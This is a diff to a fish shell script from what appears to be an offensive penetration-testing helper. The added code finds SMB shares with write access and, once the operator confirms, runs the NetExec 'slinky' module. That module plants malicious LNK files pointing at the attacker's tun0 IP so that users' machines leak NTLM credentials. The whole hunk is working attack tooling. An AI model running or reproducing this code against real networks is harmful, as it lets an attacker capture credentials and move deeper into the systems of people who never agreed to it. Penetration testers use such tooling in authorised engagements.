@@ -192,6 +192,40 @@ Examples:
             }
         }'
 
+        # Check for shares with WRITE permission and offer malicious LNK file creation
+        set write_shares (cat $shares_tmp | awk '
+        {
+            line = $0
+            if (match(line, /WRITE/)) {
+                share = substr(line, 1, RSTART-1)
+                gsub(/^[ \t]+|[ \t]+$/, "", share)
+                if (share !~ /^(IPC\$|C\$|ADMIN\$)$/) {
+                    print share
+                }
+            }
+        }')
+
+        if test -n "$write_shares"
+            ezpz_question "Write malicious LNK file on shares with WRITE permission? [y/N]: "
+            read -l confirm_lnk < /dev/tty
+            or set confirm_lnk "n" # Default to no if timeout
+            set confirm_lnk (string trim $confirm_lnk)
+            
+            if test "$confirm_lnk" = "y" -o "$confirm_lnk" = "Y"
+                # Extract tun0 IP address
+                set arch (ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)
+                
+                if test -z "$arch"
+                    ezpz_warn "Could not determine tun0 IP address. Skipping LNK file creation."
+                else
+                    ezpz_header "Creating malicious LNK files on WRITE shares"
+                    ezpz_cmd "nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$arch"
+                    
+                    nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$arch 2>/dev/null | grep SLINKY | grep -oE '(Created.*|Error.*)'
+                end
+            end
+        end
+
         # Extract share names for spidering (only READ shares, exclude default shares)
         cat $shares_tmp | awk '
         {
